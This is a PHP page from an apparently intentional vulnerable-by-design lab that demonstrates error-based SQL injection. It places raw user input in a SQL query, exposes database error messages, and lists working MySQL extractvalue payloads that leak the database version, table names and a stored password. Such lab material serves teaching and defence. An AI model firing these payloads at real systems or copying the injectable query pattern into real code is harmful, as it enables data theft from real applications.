<?php
/**
 * DEMO: Error-Based SQL Injection
 *
 * Attack goal: Trigger a DB error whose message contains extracted data.
 * The DB is configured to throw on errors, and we display the message — leaking data.
 *
 * Try these payloads in the User ID field:
 *   1 AND extractvalue(1, concat(0x7e, (SELECT version())))
 *   1 AND extractvalue(1, concat(0x7e, (SELECT database())))
 *   1 AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))
 *   1 AND extractvalue(1, concat(0x7e, (SELECT password FROM user LIMIT 1)))
 */

if ( ! defined('SQL_INJECTION_IN_PHP') ) {
    die('Direct access not permitted');
}
?>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">
    <strong>⚠️ Vulnerable Page — Error-Based Injection Demo</strong>
  </div>
  <div class="card-body">
    <p class="mb-1"><strong>Objective:</strong> Force the database to include sensitive data inside an error message.</p>
    <p class="mb-1"><strong>Try these payloads in the User ID field:</strong></p>
    <ul class="mb-0">
      <li><code>1 AND extractvalue(1, concat(0x7e, (SELECT version())))</code> — leaks DB version</li>
      <li><code>1 AND extractvalue(1, concat(0x7e, (SELECT database())))</code> — leaks DB name</li>
      <li><code>1 AND extractvalue(1, concat(0x7e, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))</code> — leaks all table names</li>
      <li><code>1 AND extractvalue(1, concat(0x7e, (SELECT password FROM user LIMIT 1)))</code> — leaks a password</li>
    </ul>
    <p class="mt-2 mb-0 text-muted small">Key point: suppressing output is not enough — verbose DB errors are a data channel.</p>
  </div>
</div>

<form method="get" class="mb-3">
  <input type="hidden" name="action" value="error_based"/>
  <div class="input-group" style="max-width:400px">
    <span class="input-group-text">User ID</span>
    <input type="text" name="uid" class="form-control"
           placeholder="e.g. 1"
           value="<?= htmlspecialchars($_GET['uid'] ?? '') ?>">
    <button class="btn btn-outline-secondary" type="submit">Lookup</button>
  </div>
</form>

<?php
$uid = $_GET['uid'] ?? '';

if ($uid !== '') {
    // Intentionally vulnerable — raw input in WHERE clause
    $sql = "SELECT id, firstname, lastname, email, account_type FROM user WHERE id = {$uid}";

    echo '<div class="alert alert-secondary"><strong>Generated SQL:</strong><br><code>' . htmlspecialchars($sql) . '</code></div>';

    try {
        // PDO set to throw exceptions — error message is shown to the user
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
        $result = $pdo->query($sql);

        if ($result && $result->rowCount() > 0) {
            $row = $result->fetch(\PDO::FETCH_ASSOC);
            echo '<table class="table table-bordered table-sm" style="max-width:600px">';
            echo '<thead class="table-dark"><tr><th>ID</th><th>Name</th><th>Email</th><th>Role</th></tr></thead>';
            echo '<tbody><tr>';
            echo '<td>' . htmlspecialchars($row['id']) . '</td>';
            echo '<td>' . htmlspecialchars($row['firstname'] . ' ' . $row['lastname']) . '</td>';
            echo '<td>' . htmlspecialchars($row['email']) . '</td>';
            echo '<td>' . htmlspecialchars($row['account_type']) . '</td>';
            echo '</tr></tbody></table>';
        } else {
            echo '<div class="alert alert-info">No user found for that ID.</div>';
        }
    } catch (\PDOException $e) {
        // Intentionally expose full error — this is the attack surface
        echo '<div class="alert alert-danger">';
        echo '<strong>Database Error (this is the attack — data leaks through the error message):</strong><br>';
        echo '<code>' . htmlspecialchars($e->getMessage()) . '</code>';
        echo '</div>';
    }
}
?>
